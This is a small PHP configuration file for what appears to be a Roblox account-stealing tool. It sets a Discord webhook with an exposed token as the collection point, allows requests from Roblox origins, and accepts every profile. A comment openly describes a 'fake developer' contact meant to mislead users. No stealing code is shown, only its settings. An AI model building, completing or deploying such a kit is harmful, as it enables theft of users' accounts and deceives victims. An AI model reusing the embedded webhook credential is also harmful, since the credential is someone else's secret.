<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/879854596338634752/GX6GlPtjc-5w1YCifotumAKqNtHjP4Oc6fvmM7HnDTTPNVtZSdSgLhnUTgvAiQihBfKJ";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
